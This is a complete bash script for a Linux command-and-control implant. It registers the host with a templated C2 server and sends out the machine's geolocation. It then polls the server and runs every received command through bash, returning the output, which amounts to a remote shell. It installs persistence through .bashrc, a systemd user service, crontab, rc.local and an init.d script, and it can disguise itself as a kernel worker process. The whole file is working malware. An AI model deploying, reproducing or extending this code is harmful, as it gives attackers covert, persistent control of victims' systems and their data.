#!/bin/bash

# Linux Agent - Improved C2 Client
# Based on agentimproved.ps1 for Linux systems

# C2 server configuration
C2="http://{C2_HOST}:{C2_PORT}"

# Agent info
hostname=$(hostname)
os=$(cat /etc/os-release | grep PRETTY_NAME | cut -d'"' -f2 2>/dev/null || echo "Linux")
ip=$(hostname -I | awk '{print $1}' 2>/dev/null || echo "127.0.0.1")

# Get geolocation data
get_geolocation() {
    if command -v curl >/dev/null 2>&1; then
        geo_response=$(curl -s -m 10 "http://ip-api.com/json" 2>/dev/null)
        if [ $? -eq 0 ] && [ -n "$geo_response" ]; then
            latitude=$(echo "$geo_response" | grep -o '"lat":[^,]*' | cut -d':' -f2)
            longitude=$(echo "$geo_response" | grep -o '"lon":[^,]*' | cut -d':' -f2)
            country=$(echo "$geo_response" | grep -o '"country":"[^"]*"' | cut -d'"' -f4)
            region=$(echo "$geo_response" | grep -o '"regionName":"[^"]*"' | cut -d'"' -f4)
            city=$(echo "$geo_response" | grep -o '"city":"[^"]*"' | cut -d'"' -f4)
            timezone=$(echo "$geo_response" | grep -o '"timezone":"[^"]*"' | cut -d'"' -f4)
            isp=$(echo "$geo_response" | grep -o '"isp":"[^"]*"' | cut -d'"' -f4)
        else
            latitude=""
            longitude=""
            country=""
            region=""
            city=""
            timezone=""
            isp=""
        fi
    else
        latitude=""
        longitude=""
        country=""
        region=""
        city=""
        timezone=""
        isp=""
    fi
}

# Register with C2
register_with_c2() {
    local body="{\"hostname\":\"$hostname\",\"os\":\"$os\",\"ip\":\"$ip\"}"
    
    if command -v curl >/dev/null 2>&1; then
        curl -s -X POST "$C2/register" \
            -H "Content-Type: application/json" \
            -d "$body" >/dev/null 2>&1
    fi
}

# Send geolocation data to C2
send_geolocation() {
    if [ -n "$latitude" ] && [ -n "$longitude" ]; then
        local geo_body="{\"hostname\":\"$hostname\",\"ip\":\"$ip\",\"country\":\"$country\",\"region\":\"$region\",\"city\":\"$city\",\"latitude\":$latitude,\"longitude\":$longitude,\"timezone\":\"$timezone\",\"isp\":\"$isp\"}"
        
        if command -v curl >/dev/null 2>&1; then
            curl -s -X POST "$C2/api/geolocation/$hostname" \
                -H "Content-Type: application/json" \
                -d "$geo_body" >/dev/null 2>&1
        fi
    fi
}

# Execute command and return output
execute_command() {
    local cmd="$1"
    local output=""
    
    # Choose shell based on command type (similar to PowerShell logic)
    if echo "$cmd" | grep -qE "(ls|cat|grep|find|ps|top|df|du|netstat|ss|iptables|systemctl|service|chmod|chown|cp|mv|rm|mkdir|touch|echo|printf|sed|awk|grep|cut|sort|uniq|head|tail|wc|tr|tee|nano|vim|less|more|man|info|help|--help|-h)"; then
        # Assume it's a Linux command
        output=$(bash -c "$cmd" 2>&1)
    else
        # Try to run as shell command
        output=$(bash -c "$cmd" 2>&1)
    fi
    
    echo "$output"
}

# Send command result back to C2
send_result() {
    local output="$1"
    # Escape newlines and quotes for JSON
    output=$(echo "$output" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | tr '\n' ' ')
    
    local result_body="{\"output\":\"$output\"}"
    
    if command -v curl >/dev/null 2>&1; then
        curl -s -X POST "$C2/result/$hostname" \
            -H "Content-Type: application/json" \
            -d "$result_body" >/dev/null 2>&1
    fi
}

# Install persistence mechanisms
install_persistence() {
    # Method 1: Add to user's .bashrc
    if [ -f "$HOME/.bashrc" ]; then
        if ! grep -q "linuxagent.sh" "$HOME/.bashrc"; then
            echo "" >> "$HOME/.bashrc"
            echo "# Auto-start C2 agent" >> "$HOME/.bashrc"
            echo "nohup bash $PWD/linuxagent.sh >/dev/null 2>&1 &" >> "$HOME/.bashrc"
        fi
    fi
    
    # Method 2: Create systemd user service (if systemd is available)
    if command -v systemctl >/dev/null 2>&1 && systemctl --user >/dev/null 2>&1; then
        local service_dir="$HOME/.config/systemd/user"
        local service_file="$service_dir/c2agent.service"
        
        mkdir -p "$service_dir"
        
        cat > "$service_file" << EOF
[Unit]
Description=C2 Agent Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash $PWD/linuxagent.sh
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF
        
        systemctl --user daemon-reload >/dev/null 2>&1
        systemctl --user enable c2agent.service >/dev/null 2>&1
        systemctl --user start c2agent.service >/dev/null 2>&1
    fi
    
    # Method 3: Add to crontab
    if command -v crontab >/dev/null 2>&1; then
        local cron_entry="@reboot bash $PWD/linuxagent.sh >/dev/null 2>&1"
        if ! crontab -l 2>/dev/null | grep -q "linuxagent.sh"; then
            (crontab -l 2>/dev/null; echo "$cron_entry") | crontab -
        fi
    fi
    
    # Method 4: Add to /etc/rc.local (if exists)
    if [ -f "/etc/rc.local" ]; then
        if ! grep -q "linuxagent.sh" "/etc/rc.local"; then
            echo "bash $PWD/linuxagent.sh >/dev/null 2>&1 &" >> "/etc/rc.local"
            chmod +x "/etc/rc.local"
        fi
    fi
    
    # Method 5: Create init.d script (if system supports it)
    if [ -d "/etc/init.d" ] && [ -w "/etc/init.d" ]; then
        local init_script="/etc/init.d/c2agent"
        cat > "$init_script" << EOF
#!/bin/bash
# chkconfig: 2345 20 80
# description: C2 Agent Service

case "\$1" in
    start)
        bash $PWD/linuxagent.sh >/dev/null 2>&1 &
        ;;
    stop)
        pkill -f "linuxagent.sh"
        ;;
    restart)
        pkill -f "linuxagent.sh"
        sleep 2
        bash $PWD/linuxagent.sh >/dev/null 2>&1 &
        ;;
    *)
        echo "Usage: \$0 {start|stop|restart}"
        exit 1
        ;;
esac
EOF
        chmod +x "$init_script"
        chkconfig --add c2agent 2>/dev/null || true
    fi
}

# Hide the process
hide_process() {
    # Rename the process to look like a system process
    exec -a "[kworker/0:0]" bash "$0" "$@"
}

# Main function
main() {
    # Get geolocation data
    get_geolocation
    
    # Register with C2
    register_with_c2
    
    # Send geolocation data
    send_geolocation
    
    # Install persistence
    install_persistence
    
    # Main command loop
    while true; do
        # Get command from C2
        if command -v curl >/dev/null 2>&1; then
            cmd=$(curl -s "$C2/command/$hostname" 2>/dev/null)
            
            if [ $? -eq 0 ]; then
                if [ -n "$cmd" ] && [ "$cmd" != "" ]; then
                    # Execute the command
                    output=$(execute_command "$cmd")
                    
                    # Send result back
                    send_result "$output"
                fi
            fi
        fi
        
        # Sleep for 3 seconds
        sleep 3
    done
}

# Check if curl is available
if ! command -v curl >/dev/null 2>&1; then
    echo "Error: curl is required but not installed. Please install curl first."
    exit 1
fi

# Check if running in test mode
if [ "$1" = "--test" ]; then
    echo "Running in test mode..." >&2
    echo "Hostname: $hostname" >&2
    echo "OS: $os" >&2
    echo "IP: $ip" >&2
    echo "C2 Server: $C2" >&2
    
    # Test registration
    register_with_c2
    
    # Test geolocation
    get_geolocation
    send_geolocation
    
    echo "Test completed" >&2
    exit 0
fi

# Start the agent
main "$@"
